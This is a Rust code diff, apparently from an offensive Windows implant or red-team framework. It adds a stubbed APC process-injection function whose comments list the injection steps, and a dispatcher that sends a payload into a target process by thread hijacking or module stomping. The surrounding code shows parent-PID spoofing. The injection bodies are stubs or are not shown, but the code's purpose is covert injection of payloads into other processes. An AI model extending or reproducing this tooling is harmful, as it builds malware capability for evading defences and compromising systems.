@@ -142,3 +142,38 @@ pub fn get_spoof_parent_pid() -> Option<u32> {
     }
     None
 }
+
+#[cfg(windows)]
+pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
+    // 1. Create suspended
+    // 2. Allocate and write memory
+    // 3. QueueUserAPC
+    // 4. ResumeThread
+    Ok(())
+}
+
+#[cfg(windows)]
+use crate::injection::{InjectionMethod, Injector};
+#[cfg(windows)]
+use crate::injection::thread_hijack::ThreadHijackInjector;
+#[cfg(windows)]
+use crate::injection::module_stomp::ModuleStompInjector;
+
+#[cfg(windows)]
+pub fn select_and_inject(pid: u32, payload: &[u8], method: Option<InjectionMethod>) -> anyhow::Result<()> {
+    let method = method.unwrap_or_else(|| {
+        // Here we'd do environment checks to select dynamically.
+        InjectionMethod::ThreadHijack
+    });
+
+    log::info!("Dispatching injection using method: {:?}", method);
+    
+    match method {
+        InjectionMethod::ThreadHijack => ThreadHijackInjector.inject(pid, payload),
+        InjectionMethod::ModuleStomp => ModuleStompInjector.inject(pid, payload),
+        _ => {
+            log::info!("Fallback to remote thread or other methods");
+            Ok(())
+        }
+    }
+}
